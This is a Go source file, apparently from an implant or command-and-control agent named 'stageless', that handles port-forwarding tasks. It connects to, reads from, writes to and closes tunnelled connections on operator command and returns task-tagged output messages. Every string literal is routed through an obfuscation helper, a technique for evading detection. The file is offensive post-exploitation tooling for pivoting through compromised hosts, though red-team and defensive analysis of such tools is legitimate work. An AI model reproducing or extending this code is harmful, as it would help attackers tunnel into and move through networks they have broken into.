package capabilities

import (
	"encoding/base64"
	"encoding/json"

	"stageless/utils/general"
	"stageless/utils/network/portforward"
	"stageless/utils/obf"
)

func runPortForwardPassive(input, params string) string {
	// Here is where the port forward operation is dispatched
	var p map[string]any
	if err := json.Unmarshal([]byte(params), &p); err != nil {
		return jsonErr(obf.S("bad parameters"))
	}
	switch input {
	case obf.S("connect"):
		host, _ := p[obf.S("host")].(string)
		port := int(p[obf.S("port")].(float64))
		key, _ := p[obf.S("conn_id")].(string)
		connID, ok := portforward.Connect(key, host, port)
		if !ok {
			return jsonErr(obf.S("connect failed"))
		}
		return jsonOk(map[string]any{obf.S("conn_id"): connID})
	case obf.S("read"):
		cid, _ := p[obf.S("conn_id")].(string)
		max := 65536
		if v, ok := p[obf.S("max")].(float64); ok {
			max = int(v)
		}
		data := portforward.Read(cid, max)
		if len(data) == 0 {
			return jsonOk(map[string]any{obf.S("data"): ""})
		}
		return jsonOk(map[string]any{obf.S("data"): base64.StdEncoding.EncodeToString(data)})
	case obf.S("write"):
		cid, _ := p[obf.S("conn_id")].(string)
		raw, _ := p[obf.S("data")].(string)
		data, _ := base64.StdEncoding.DecodeString(raw)
		if !portforward.Write(cid, data) {
			return jsonErr(obf.S("write failed"))
		}
		return jsonOk(nil)
	case obf.S("close"):
		cid, _ := p[obf.S("conn_id")].(string)
		portforward.Close(cid)
		return jsonOk(nil)
	default:
		return jsonErr(obf.S("unknown op ") + input)
	}
}

func RunPortForward(host, taskTag, input, params string) []byte {
	// Main function that runs a port forward task and writes the output message
	_ = host
	payload := runPortForwardPassive(input, params)
	msg := general.MarshalJSON(map[string]any{
		obf.S("option"):   obf.S("output"),
		obf.S("type"):     obf.S("port_forwarding"),
		obf.S("task_tag"): taskTag,
		obf.S("output"):   payload,
	})
	return WriteMsg(msg)
}
